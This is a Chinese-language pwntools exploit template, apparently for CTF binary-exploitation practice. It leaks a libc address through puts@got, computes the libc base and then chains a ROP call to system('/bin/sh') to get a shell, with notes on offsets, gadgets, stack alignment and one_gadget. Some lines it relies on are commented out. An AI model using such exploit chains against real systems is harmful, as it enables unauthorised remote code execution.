
# 模板概览与入口

本模板提供了一个标准的、两阶段的 `ret2libc` 攻击的 `pwntools` EXP 骨架。该方法首先利用程序中的输出函数（如 `puts`）泄露一个 libc 函数（如 `puts@got`）的真实地址，以此计算出 libc 在内存中的基地址；然后，再次利用栈溢出，构造第二段 ROP 链来调用 `system("/bin/sh")`，从而获取 Shell。

此模板适用于存在栈溢出、开启了 NX 保护、且程序会多次返回到漏洞触发点的场景。

**核心入口代码片段**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')
# libc = ELF('./libc.so.6') # 如果有远程 libc 文件

# --- 获取连接 ---
# io = process(elf.path)
# io = remote('host', port)

# --- 关键信息 ---
offset = 128  # 栈溢出偏移
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

# --- 第一阶段：泄露地址 ---
log.info("Stage 1: Leaking libc address...")
rop_leak = ROP(elf)
rop_leak.puts(elf.got['puts'])
rop_leak.call(elf.symbols['main']) # 返回 main，进行第二轮攻击

payload_leak = b'A' * offset + rop_leak.chain()
io.sendlineafter(b'> ', payload_leak)

# 解析地址
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
# libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base found: {hex(libc.address)}")

# --- 第二阶段：获取 Shell ---
log.info("Stage 2: Getting shell...")
# bin_sh = next(libc.search(b'/bin/sh\x00'))
# system = libc.symbols['system']

rop_shell = ROP(libc)
# rop_shell.call(ret_gadget) # 栈对齐
# rop_shell.call(system, [bin_sh])
payload_shell = b'A' * offset + rop_shell.chain()
io.sendlineafter(b'> ', payload_shell)

io.interactive()
```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - `elf.got['<func_name>']`: 全局偏移表 (GOT) 中某个函数（如 `puts`, `read`）的条目地址。这是泄露 libc 地址的最佳目标，因为它在函数被调用后会存放其在 libc 中的真实地址。
  - `elf.plt['<func_name>']`: 程序链接表 (PLT) 中某个函数的入口地址。ROP 链通过调用 PLT 入口来间接调用真实函数。
  - `elf.symbols['main']`: 主函数的地址。在第一阶段泄露地址后，通常会让程序返回到 `main` 函数，以便进行第二阶段的攻击。

- **关键结构体 (Key Structures)**
  - **ROP 链**: 栈上的一系列地址和数据。
    - **泄露链**: `[Padding] + [pop_rdi_ret] + [addr_to_leak] + [puts_plt] + [return_addr]`
    - **Shell 链**: `[Padding] + [ret_gadget (for alignment)] + [pop_rdi_ret] + [addr_of_"/bin/sh"] + [system_addr]`
  - **栈帧**: 理解函数调用时栈帧的结构（返回地址、`saved rbp`、局部变量）是计算溢出偏移 `offset` 的基础。

- **主要攻击面 (Main Attack Surfaces)**
  - **返回地址**: 栈溢出的首要目标，通过覆盖它来劫持控制流，启动 ROP 链。
  - **输出函数**: `puts`, `write` 等函数是泄露地址的媒介。
  - **输入函数**: `read`, `gets`, `scanf` 等是触发栈溢出的入口点。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **精确计算偏移**: 使用 `pwntools.cyclic` 和 GDB/pwndbg 的 `cyclic -l <reg_value>` 来精确计算覆盖返回地址所需的偏移量，替换模板中的硬编码 `offset`。
  2.  **自动化 Gadget 查找**: 利用 `ROP(elf)` 对象自动查找所需的 `pop rdi; ret` 和 `ret` 等 gadgets，而不是手动查找和硬编码地址，使 EXP 更具通用性。
  3.  **处理栈对齐**: 在 64 位程序中，如果第二阶段调用 `system` 失败，通常是栈对齐问题。在 `call system` 前插入一个 `ret` gadget 是标准的解决方案。模板中已预留此位置。
  4.  **适应不同输出函数**: 如果程序没有 `puts`，可以修改模板以使用 `write`。这需要额外的 `pop rsi; ret` 和 `pop rdx; ret` gadgets 来控制 `write` 的另外两个参数 `fd` 和 `count`。
      ```python
      # rop.write(1, elf.got['read'], 8)
      ```
  5.  **寻找 `/bin/sh`**: 如果目标程序的 libc 中没有 `"/bin/sh"` 字符串，可以考虑：
      -   在 BSS 段或其他可写区域手动写入 `"/bin/sh"` 字符串，然后 ROP 调用 `system`。
      -   ROP 调用 `read(0, bss_addr, 8)`，从标准输入读取 `"/bin/sh"` 到 BSS 段。
  6.  **`one-gadget` 替代方案**: 在泄露 libc 基地址后，如果目标 libc 中存在满足条件的 `one-gadget`，可以放弃构造 `system("/bin/sh")` 的 ROP 链，直接跳转到 `libc.address + one_gadget_offset` 来获取 shell，这能缩短 payload。
      ```python
      # one_gadget = libc.address + 0x...
      # payload_shell = b'A' * offset + p64(one_gadget)
      ```
  7.  **封装为函数**: 将泄露地址和获取 shell 的过程封装成独立的函数，使主逻辑更清晰，便于调试和复用。
